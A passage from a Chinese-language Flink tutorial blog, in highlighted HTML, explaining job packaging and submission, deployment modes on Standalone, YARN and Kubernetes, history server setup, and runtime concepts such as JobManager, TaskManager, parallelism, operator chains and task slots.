class="name">exclude</span>&gt;</span>log4j:*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">artifactSet</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">filters</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">                                <span class="comment">&lt;!-- Do not copy the signatures in the META-INF folder.</span></span><br><span class="line"><span class="comment">                                Otherwise, this might cause SecurityExceptions when using the JAR. --&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">artifact</span>&gt;</span>*:*<span class="tag">&lt;/<span class="name">artifact</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.SF<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.DSA<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.RSA<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">filters</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">transformers</span> <span class="attr">combine.children</span>=<span class="string">"append"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">transformer</span></span></span><br><span class="line"><span class="tag">                                    <span class="attr">implementation</span>=<span class="string">"org.apache.maven.plugins.shade.resource.ServicesResourceTransformer"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">transformer</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">transformers</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下一步是在Web UI上提交作业，任务打包完成后，我们打开Flink的WEB UI页面，在右侧导航栏点击“Submit New Job”，然后点击按钮“+ Add New”，选择要上传运行的JAR包；点击该JAR包，出现任务配置页面，进行相应配置：<strong>主要配置程序入口主类的全类名</strong>，任务运行的并行度，任务运行所需的配置参数和保存点路径等，如下图所示，配置完成后，即可点击按钮“Submit”，将任务提交到集群运行</p><p><img src="http://qnypic.shawncoding.top/blog/202404161646740.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令行提交作业</span></span><br><span class="line">bin/flink run -m hadoop102:8081 -c com.atguigu.wc.SocketStreamWordCount ./FlinkTutorial-1.0-SNAPSHOT.jar</span><br><span class="line"><span class="comment"># 在浏览器中打开Web UI，http://hadoop102:8081查看应用执行情况</span></span><br></pre></td></tr></table></figure><h2 id="3、部署模式">3、部署模式</h2><p>在一些应用场景中，对于集群资源分配和占用的方式，可能会有特定的需求。Flink为各种场景提供了不同的部署模式，主要有以下三种：<strong>会话模式（Session Mode）、单作业模式（Per-Job Mode）、应用模式（Application Mode）</strong>。</p><p>它们的区别主要在于：<strong>集群的生命周期以及资源的分配方式；以及应用的main方法到底在哪里执行——客户端（Client）还是JobManager</strong>。</p><h3 id="3-1-会话模式（Session-Mode）">3.1 会话模式（Session Mode）</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161646741.png" alt></p><h3 id="3-2-单作业模式（Per-Job-Mode）">3.2 单作业模式（Per-Job Mode）</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161646742.png" alt></p><h3 id="3-3-应用模式（Application-Mode）">3.3 应用模式（Application Mode）</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161646743.png" alt></p><h2 id="4、Standalone运行模式（了解）">4、Standalone运行模式（了解）</h2><p>独立模式是独立运行的，不依赖任何外部的资源管理平台；当然独立也是有代价的：如果<strong>资源不足，或者出现故障，没有自动扩展或重分配资源的保证，必须手动处理</strong>。所以独立模式一般只用在开发测试或作业非常少的场景下</p><h3 id="4-1-会话模式部署">4.1 会话模式部署</h3><p>上面讲的就是该模式，提前启动集群，并通过Web页面客户端提交任务（可以多个任务，但是集群资源固定）</p><h3 id="4-2-单作业模式部署">4.2 单作业模式部署</h3><p>Flink的Standalone集群并不支持单作业模式部署。因为单作业模式需要借助一些资源管理平台</p><h3 id="4-3-应用模式部署">4.3  应用模式部署</h3><p>应用模式下不会提前创建集群，所以不能调用start-cluster.sh脚本。我们可以使用同样在bin目录下的standalone-job.sh来创建一个JobManager</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 环境准备。在hadoop102中执行以下命令启动netcat</span></span><br><span class="line">nc -lk 7777</span><br><span class="line"><span class="comment"># 进入到Flink的安装路径下，将应用程序的jar包放到lib/目录下</span></span><br><span class="line">mv FlinkTutorial-1.0-SNAPSHOT.jar lib/</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">bin/standalone-job.sh start --job-classname com.atguigu.wc.SocketStreamWordCount</span><br><span class="line"><span class="comment"># 同样是使用bin目录下的脚本，启动TaskManager。</span></span><br><span class="line">bin/taskmanager.sh start</span><br><span class="line"><span class="comment"># 在hadoop102上模拟发送单词数据</span></span><br><span class="line"><span class="comment"># 在hadoop102:8081地址中观察输出数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果希望停掉集群，同样可以使用脚本，命令如下。</span></span><br><span class="line">bin/taskmanager.sh stop</span><br><span class="line">bin/standalone-job.sh stop</span><br></pre></td></tr></table></figure><h2 id="5、YARN运行模式（重点）">5、YARN运行模式（重点）</h2><p>YARN上部署的过程是：客户端把Flink应用提交给Yarn的ResourceManager，Yarn的ResourceManager会向Yarn的NodeManager申请容器。在这些容器上，Flink会部署JobManager和TaskManager的实例，从而启动集群。<strong>Flink会根据运行在JobManger上的作业所需要的Slot数量动态分配TaskManager资源</strong></p><h3 id="5-1-相关准备和配置">5.1 相关准备和配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在将Flink任务部署至YARN集群之前，需要确认集群是否安装有Hadoop，保证Hadoop版本至少在2.2以上，并且集群中安装有HDFS服务</span></span><br><span class="line"><span class="comment"># 配置环境变量，增加环境变量配置如下：</span></span><br><span class="line">sudo vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment"># 修改</span></span><br><span class="line">HADOOP_HOME=/opt/module/hadoop-3.3.4</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$HADOOP_HOME</span>/bin:<span class="variable">$HADOOP_HOME</span>/sbin</span><br><span class="line"><span class="built_in">export</span> HADOOP_CONF_DIR=<span class="variable">$&#123;HADOOP_HOME&#125;</span>/etc/hadoop</span><br><span class="line"><span class="built_in">export</span> HADOOP_CLASSPATH=`hadoop classpath`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Hadoop集群，包括HDFS和YARN，102 dfs,103 yarn</span></span><br><span class="line">start-dfs.sh</span><br><span class="line">start-yarn.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># hadoop102中执行以下命令启动netcat</span></span><br><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure><h3 id="5-2-会话模式部署">5.2 会话模式部署</h3><p>YARN的会话模式与独立集群略有不同，需要首先申请一个YARN会话（YARN Session）来启动Flink集群</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动Hadoop集群（HDFS、YARN）</span></span><br><span class="line"><span class="comment"># 执行脚本命令向YARN集群申请资源，开启一个YARN会话，启动Flink集群</span></span><br><span class="line">bin/yarn-session.sh -nm <span class="built_in">test</span></span><br><span class="line"><span class="comment"># -d：分离模式，如果你不想让Flink YARN客户端一直前台运行，可以使用这个参数，即使关掉当前对话窗口，YARN session也可以后台运行</span></span><br><span class="line"><span class="comment"># -jm（--jobManagerMemory）：配置JobManager所需内存，默认单位MB</span></span><br><span class="line"><span class="comment"># -nm（--name）：配置在YARN UI界面上显示的任务名</span></span><br><span class="line"><span class="comment"># -qu（--queue）：指定YARN队列名</span></span><br><span class="line"><span class="comment"># -tm（--taskManager）：配置每个TaskManager所使用内存</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：Flink1.11.0版本不再使用-n参数和-s参数分别指定TaskManager数量和slot数量，</span></span><br><span class="line"><span class="comment"># YARN会按照需求动态分配TaskManager和slot。所以从这个意义上讲，YARN的会话模式也不会把集群资源固定，同样是动态分配的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># YARN Session启动之后会给出一个Web UI地址以及一个YARN application ID，如下所示，用户可以通过Web UI或者命令行两种方式提交作业</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================提交作业========</span></span><br><span class="line"><span class="comment"># 通过Web UI提交作业，和standalone相同</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过命令行提交作业</span></span><br><span class="line"><span class="comment"># 将FlinkTutorial-1.0-SNAPSHOT.jar任务上传至集群</span></span><br><span class="line"><span class="comment"># 执行以下命令将该任务提交到已经开启的Yarn-Session中运行</span></span><br><span class="line"><span class="comment"># 客户端可以自行确定JobManager的地址，也可以通过-m或者-jobmanager参数指定JobManager的地址，JobManager的地址在YARN Session的启动页面中可以找到</span></span><br><span class="line">bin/flink run -c com.atguigu.wc.SocketStreamWordCount FlinkTutorial-1.0-SNAPSHOT.jar</span><br><span class="line"><span class="comment"># 任务提交成功后，可在YARN的Web UI界面查看运行情况。hadoop103:8088</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># yarn任务优雅停止,也可以yarn可视化面板直接kill</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"stop"</span> | ./bin/yarn-session.sh -id application_1680702304497_0003</span><br></pre></td></tr></table></figure><h3 id="5-3-单作业模式部署">5.3 单作业模式部署</h3><p>在YARN环境中，由于有了外部平台做资源调度，所以我们也可以直接向YARN提交一个单独的作业，从而启动一个Flink集群</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bin/flink run -d -t yarn-per-job -c com.atguigu.wc.SocketStreamWordCount FlinkTutorial-1.0-SNAPSHOT.jar</span><br><span class="line"><span class="comment"># 注意：如果启动过程中报如下异常（本身bug可忽略）</span></span><br><span class="line"><span class="comment"># Exception in thread “Thread-5” java.lang.IllegalStateException: Trying to access closed classloader....</span></span><br><span class="line"><span class="comment"># 解决办法：在flink的/opt/module/flink-1.17.0/conf/flink-conf.yaml配置文件中设置</span></span><br><span class="line">vim flink-conf.yaml</span><br><span class="line">classloader.check-leaked-classloader: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在命令行中查看或取消作业</span></span><br><span class="line"><span class="comment"># 这里的application_XXXX_YY是当前应用的ID，&lt;jobId&gt;是作业的ID。注意如果取消作业，整个Flink集群也会停掉</span></span><br><span class="line">bin/flink list -t yarn-per-job -Dyarn.application.id=application_XXXX_YY</span><br><span class="line">bin/flink cancel -t yarn-per-job -Dyarn.application.id=application_XXXX_YY &lt;jobId&gt;</span><br></pre></td></tr></table></figure><h3 id="5-4-应用模式部署">5.4 应用模式部署</h3><p>应用模式非常简单，与单作业模式类似，直接执行flink run-application命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行命令提交作业</span></span><br><span class="line">bin/flink run-application -t yarn-application -c com.atguigu.wc.SocketStreamWordCount FlinkTutorial-1.0-SNAPSHOT.jar </span><br><span class="line"><span class="comment"># 在命令行中查看或取消作业</span></span><br><span class="line">bin/flink list -t yarn-application -Dyarn.application.id=application_XXXX_YY</span><br><span class="line">bin/flink cancel -t yarn-application -Dyarn.application.id=application_XXXX_YY &lt;jobId&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =========上传HDFS提交=========</span></span><br><span class="line"><span class="comment"># 可以通过yarn.provided.lib.dirs配置选项指定位置，将flink的依赖上传到远程</span></span><br><span class="line"><span class="comment"># 上传flink的lib和plugins到HDFS上</span></span><br><span class="line">hadoop fs -mkdir /flink-dist</span><br><span class="line">hadoop fs -put lib/ /flink-dist</span><br><span class="line">hadoop fs -put plugins/ /flink-dist</span><br><span class="line"><span class="comment"># 上传自己的jar包到HDFS</span></span><br><span class="line">hadoop fs -mkdir /flink-jars</span><br><span class="line">hadoop fs -put FlinkTutorial-1.0-SNAPSHOT.jar /flink-jars</span><br><span class="line"><span class="comment"># 提交作业</span></span><br><span class="line">bin/flink run-application -t yarn-application  -Dyarn.provided.lib.dirs=<span class="string">"hdfs://hadoop102:8020/flink-dist"</span>  -c com.atguigu.wc.SocketStreamWordCount  hdfs://hadoop102:8020/flink-jars/FlinkTutorial-1.0-SNAPSHOT.jar</span><br><span class="line"><span class="comment"># flink本身的依赖和用户jar可以预先上传到HDFS，而不需要单独发送到集群，这就使得作业提交更加轻量</span></span><br></pre></td></tr></table></figure><h2 id="6、K8S-运行模式（了解）">6、K8S 运行模式（了解）</h2><p>容器化部署是如今业界流行的一项技术，基于Docker镜像运行能够让用户更加方便地对应用进行管理和运维。容器管理工具中最为流行的就是Kubernetes（k8s），而Flink也在最近的版本中支持了k8s部署模式。基本原理与YARN是类似的，具体配置可以参见官网说明</p><h2 id="7、历史服务器">7、历史服务器</h2><p>运行 Flink job 的集群一旦停止，只能去 yarn 或本地磁盘上查看日志，不再可以查看作业挂掉之前的运行的 Web UI，很难清楚知道作业在挂的那一刻到底发生了什么。如果我们还没有 Metrics 监控的话，那么完全就只能通过日志去分析和定位问题了，所以如果能还原之前的 Web UI，我们可以通过 UI 发现和定位一些问题。</p><p>Flink提供了历史服务器，用来在相应的 Flink 集群关闭后查询已完成作业的统计信息。我们都知道只有当作业处于运行中的状态，才能够查看到相关的WebUI统计信息。通过 History Server 我们才能查询这些已完成作业的统计信息，无论是正常退出还是异常退出。</p><p>此外，它对外提供了 REST API，它接受 HTTP 请求并使用 JSON 数据进行响应。Flink 任务停止后，JobManager 会将已经完成任务的统计信息进行存档，History Server 进程则在任务停止后可以对任务统计信息进行查询。比如：最后一次的 Checkpoint、任务运行时的相关配置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建存储目录</span></span><br><span class="line">hadoop fs -mkdir -p /logs/flink-job</span><br><span class="line"><span class="comment"># 在 flink-conf.yaml中添加如下配置</span></span><br><span class="line">jobmanager.archive.fs.dir: hdfs://hadoop102:8020/logs/flink-job</span><br><span class="line">historyserver.web.address: hadoop102</span><br><span class="line">historyserver.web.port: 8082</span><br><span class="line">historyserver.archive.fs.dir: hdfs://hadoop102:8020/logs/flink-job</span><br><span class="line">historyserver.archive.fs.refresh-interval: 5000</span><br><span class="line"><span class="comment"># 启动历史服务器</span></span><br><span class="line">bin/historyserver.sh start</span><br><span class="line"><span class="comment"># 停止历史服务器</span></span><br><span class="line">bin/historyserver.sh stop</span><br><span class="line"><span class="comment"># 在浏览器地址栏输入：http://hadoop102:8082  查看已经停止的 job 的统计信息</span></span><br></pre></td></tr></table></figure><h1>三、Flink运行时架构</h1><h2 id="1、系统架构">1、系统架构</h2><p><img src="http://qnypic.shawncoding.top/blog/202404161646744.png" alt></p><h3 id="1-1-作业管理器（JobManager）">1.1 作业管理器（JobManager）</h3><p>JobManager是一个Flink集群中任务管理和调度的核心，是控制应用执行的主进程。也就是说，每个应用都应该被唯一的JobManager所控制执行。JobManger又包含3个不同的组件</p><ul><li><strong>JobMaster</strong></li></ul><p>JobMaster是JobManager中最核心的组件，<strong>负责处理单独的作业（Job）</strong>。所以JobMaster和具体的Job是一一对应的，多个Job可以同时运行在一个Flink集群中, 每个Job都有一个自己的JobMaster。需要注意在早期版本的Flink中，没有JobMaster的概念；而JobManager的概念范围较小，实际指的就是现在所说的JobMaster。</p><p>在作业提交时，JobMaster会先接收到要执行的应用。JobMaster会把JobGraph转换成一个物理层面的数据流图，这个图被叫作“执行图”（ExecutionGraph），它包含了所有可以并发执行的任务。JobMaster会向资源管理器（ResourceManager）发出请求，申请执行任务必要的资源。一旦它获取到了足够的资源，就会将执行图分发到真正运行它们的TaskManager上。而在运行过程中，JobMaster会负责所有需要中央协调的操作，比如说检查点（checkpoints）的协调。</p><ul><li><strong>资源管理器（ResourceManager）</strong></li></ul><p>ResourceManager主要<strong>负责资源的分配和管理</strong>，在Flink 集群中只有一个。所谓“资源”，主要是指TaskManager的任务槽（task slots）。任务槽就是Flink集群中的资源调配单元，包含了机器用来执行计算的一组CPU和内存资源。每一个任务（Task）都需要分配到一个slot上执行。</p><p>这里注意要把Flink内置的ResourceManager和其他资源管理平台（比如YARN）的ResourceManager区分开。</p><ul><li><strong>分发器（Dispatcher）</strong></li></ul><p>Dispatcher主要负责提供一个REST接口，<strong>用来提交应用，并且负责为每一个新提交的作业启动一个新的JobMaster 组件</strong>。Dispatcher也会启动一个Web UI，用来方便地展示和监控作业执行的信息。Dispatcher在架构中并不是必需的，在不同的部署模式下可能会被忽略掉。</p><h3 id="1-2-任务管理器（TaskManager）">1.2 任务管理器（TaskManager）</h3><p>TaskManager是Flink中的工作进程，数据流的具体计算就是它来做的。Flink集群中必须至少有一个TaskManager；每一个TaskManager都包含了一定数量的任务槽（task slots）。Slot是资源调度的最小单位，slot的数量限制了TaskManager能够并行处理的任务数量。</p><p>启动之后，TaskManager会向资源管理器注册它的slots；收到资源管理器的指令后，TaskManager就会将一个或者多个槽位提供给JobMaster调用，JobMaster就可以分配任务来执行了。在执行过程中，TaskManager可以缓冲数据，还可以跟其他运行同一应用的TaskManager交换数据。</p><h2 id="2、核心概念">2、核心概念</h2><h3 id="2-1-并行度（Parallelism）">2.1 并行度（Parallelism）</h3><p>当要处理的数据量非常大时，我们可以把一个算子操作，“复制”多份到多个节点，数据来了之后就可以到其中任意一个执行。这样一来，一个算子任务就被拆分成了多个并行的“子任务”（subtasks），再将它们分发到不同节点，就真正实现了并行计算。在Flink执行过程中，每一个算子（operator）可以包含一个或多个子任务（operator subtask），这些子任务在不同的线程、不同的物理机或不同的容器中完全独立地执行</p><p><img src="http://qnypic.shawncoding.top/blog/202404161646745.png" alt></p><p>一个特定算子的子任务（subtask）的个数被称之为其并行度（parallelism）。这样，包含并行子任务的数据流，就是并行数据流，它需要多个分区（stream partition）来分配并行任务。一般情况下，一个流程序的并行度，可以认为就是其所有算子中最大的并行度。一个程序中，不同的算子可能具有不同的并行度。</p><p>例如：如上图所示，当前数据流中有source、map、window、sink四个算子，其中sink算子的并行度为1，其他算子的并行度都为2。所以这段流处理程序的并行度就是2。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置并行度</span></span><br><span class="line"><span class="comment"># ===================代码中设置=============</span></span><br><span class="line"><span class="comment"># 我们在代码中，可以很简单地在算子后跟着调用setParallelism()方法，来设置当前算子的并行度</span></span><br><span class="line">stream.map(word -&gt; Tuple2.of(word, 1L)).setParallelism(2);</span><br><span class="line"><span class="comment"># 这种方式设置的并行度，只针对当前算子有效。</span></span><br><span class="line"><span class="comment"># 直接调用执行环境的setParallelism()方法，全局设定并行度</span></span><br><span class="line"><span class="comment"># 如果在程序中对全局并行度进行硬编码，会导致无法动态扩容</span></span><br><span class="line">env.setParallelism(2);</span><br><span class="line"><span class="comment"># 注意，由于keyBy不是算子，所以无法对keyBy设置并行度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================提交应用时设置=============</span></span><br><span class="line"><span class="comment"># 在使用flink run命令提交应用时，可以增加-p参数来指定当前应用程序执行的并行度，它的作用类似于执行环境的全局设置</span></span><br><span class="line">bin/flink run –p 2 –c com.atguigu.wc.SocketStreamWordCount ./FlinkTutorial-1.0-SNAPSHOT.jar</span><br><span class="line"><span class="comment"># 如果我们直接在Web UI上提交作业，也可以在对应输入框中直接添加并行度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================配置文件中设置==============</span></span><br><span class="line"><span class="comment"># 我们还可以直接在集群的配置文件flink-conf.yaml中直接更改默认并行度</span></span><br><span class="line">parallelism.default: 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个设置对于整个集群上提交的所有作业有效，初始值为1。无论在代码中设置、还是提交时的-p参数，都不是必须的；</span></span><br><span class="line"><span class="comment"># 所以在没有指定并行度的时候，就会采用配置文件中的集群默认并行度。在开发环境中，没有配置文件，默认并行度就是当前机器的CPU核心数</span></span><br></pre></td></tr></table></figure><h3 id="2-2-算子链（Operator-Chain）">2.2 算子链（Operator Chain）</h3><p>一个数据流在算子之间传输数据的形式可以是一对一（one-to-one）的直通（forwarding）模式，也可以是打乱的重分区（redistributing）模式，具体是哪一种形式，取决于算子的种类。</p><ul><li><strong>一对一（One-to-one，forwarding）</strong></li></ul><p>这种模式下，数据流维护着分区以及元素的顺序。比如图中的source和map算子，source算子读取数据之后，可以直接发送给map算子做处理，它们之间<strong>不需要重新分区，也不需要调整数据的顺序</strong>。这就意味着map 算子的子任务，看到的元素个数和顺序跟source 算子的子任务产生的完全一样，保证着“一对一”的关系。<strong>map、filter、flatMap等算子都是这种one-to-one的对应关系</strong>。这种关系<strong>类似于Spark中的窄依赖</strong>。</p><ul><li><strong>重分区（Redistributing）</strong></li></ul><p>在这种模式下，数据流的分区会发生改变。比如图中的map和后面的keyBy/window算子之间，以及keyBy/window算子和Sink算子之间，都是这样的关系。每一个算子的子任务，会<strong>根据数据传输的策略，把数据发送到不同的下游目标任务</strong>。这些传输方式都会引起重分区的过程，<strong>这一过程类似于Spark中的shuffle</strong>。</p><ul><li><strong>合并算子链</strong></li></ul><p>在Flink中，并行度相同的一对一（one to one）算子操作，可以直接链接在一起形成一个“大”的任务（task），这样原来的算子就成为了真正任务里的一部分。将算子链接成task是非常有效的优化：可以减少线程之间的切换和基于缓存区的数据交换，在减少时延的同时提升吞吐量。Flink默认会按照算子链的原则进行链接合并，如果我们想要禁止合并或者自行定义，也可以在代码中对算子做一些特定的设置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 禁用算子链</span></span><br><span class="line">.map(word -&gt; Tuple2.of(word, <span class="number">1L</span>)).disableChaining();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从当前算子开始新链</span></span><br><span class="line">.map(word -&gt; Tuple2.of(word, <span class="number">1L</span>)).startNewChain()</span><br></pre></td></tr></table></figure><h3 id="2-3-任务槽（Task-Slots）">2.3 任务槽（Task Slots）</h3><ul><li><strong>任务槽（Task Slots）</strong></li></ul><p>Flink中每一个TaskManager都是一个JVM进程，它可以启动多个独立的线程，来并行执行多个子任务（subtask）。很显然，TaskManager的计算资源是有限的，并行的任务越多，每个线程的资源就会越少。那一个TaskManager到底能并行处理多少个任务呢？为了控制并发量，我们需要在TaskManager上对每个任务运行所占用的资源做出明确的划分，这就是所谓的任务槽（task slots）。<strong>每个任务槽（task slot）其实表示了TaskManager拥有计算资源的一个固定大小的子集。这些资源就是用来独立执行一个子任务的</strong>。</p><p><img src="http://qnypic.shawncoding.top/blog/202404161646746.png" alt></p><ul><li><strong>任务槽数量的设置</strong></li></ul><p>在Flink的<code>/opt/module/flink/conf/flink-conf.yaml</code>配置文件中，可以设置TaskManager的slot数量，默认是1个slot</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">taskmanager.numberOfTaskSlots: 8</span><br><span class="line"><span class="comment"># 需要注意的是，slot目前仅仅用来隔离内存，不会涉及CPU的隔离。</span></span><br><span class="line"><span class="comment"># 在具体应用时，可以将slot数量配置为机器的CPU核心数，尽量避免不同任务之间对CPU的竞争。</span></span><br><span class="line"><span class="comment"># 这也是开发环境默认并行度设为机器CPU数量的原因。</span></span><br></pre></td></tr></table></figure><ul><li><strong>任务对任务槽的共享</strong></li></ul><p><img src="http://qnypic.shawncoding.top/blog/202404161646747.png" alt></p><p>默认情况下，Flink是允许子任务共享slot的。如果我们保持sink任务并行度为1不变，而作业提交时设置全局并行度为6，那么前两个任务节点就会各自有6个并行子任务，整个流处理程序则有13个子任务。如上图所示，<strong>只要属于同一个作业</strong>，那么对于<strong>不同任务节点（算子）的并行子任务，就可以放到同一个slot上执行</strong>。所以对于第一个任务节点source→map，它的6个并行子任务必须分到不同的slot上，而第二个任务节点keyBy/window/apply的并行子任务却可以和第一个任务节点共享slot。当我们将资源密集型和非密集型的任务同时放到一个slot中，它们就可以自行分配对资源占用的比例，从而保证最重的活平均分配给所有的TaskManager。</p><p>slot共享另一个好处就是允许我们保存完整的作业管道。这样一来，即使某个TaskManager出现故障宕机，其他节点也可以完全不受影响，作业的任务可以继续执行。当然，Flink默认是允许slot共享的，如果希望某个算子对应的任务完全独占一个slot，或者只有某一部分算子共享slot，我们也可以通过设置“slot共享组”手动指定：<code>.map(word -&gt; Tuple2.of(word, 1L)).slotSharingGroup(&quot;1&quot;);</code>这样，只有属于同一个slot共享组的子任务，才会开启slot共享；<strong>不同组之间的任务是完全隔离的，必须分配到不同的slot上</strong>。在这种场景下，总共需要的slot数量，就是各个slot共享组最大并行度的总和。</p><h3 id="2-4-任务槽和并行度的关系">2.4 任务槽和并行度的关系</h3><p>任务槽和并行度都跟程序的并行执行有关，但两者是完全不同的概念。简单来说任务槽是静态的概念，是指TaskManager具有的并发执行能力，可以通过参数taskmanager.numberOfTaskSlots进行配置；而并行度是动态概念，也就是TaskManager运行程序时实际使用的并发能力，可以通过参数<code>parallelism.default</code>进行配置。</p><p><img src="http://qnypic.shawncoding.top/blog/202404161646748.png" alt></p><h2 id="3、作业提交流程">3、作业提交流程</h2><h3 id="3-1-Standalone会话模式作业提交流程">3.1 Standalone会话模式作业提交流程</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161646749.png" alt></p><h3 id="3-2-逻辑流图-作业图-执行图-物理流图">3.2 逻辑流图/作业图/执行图/物理流图</h3><p>逻辑流图（StreamGraph）→ 作业图（JobGraph）→ 执行图（ExecutionGraph）→ 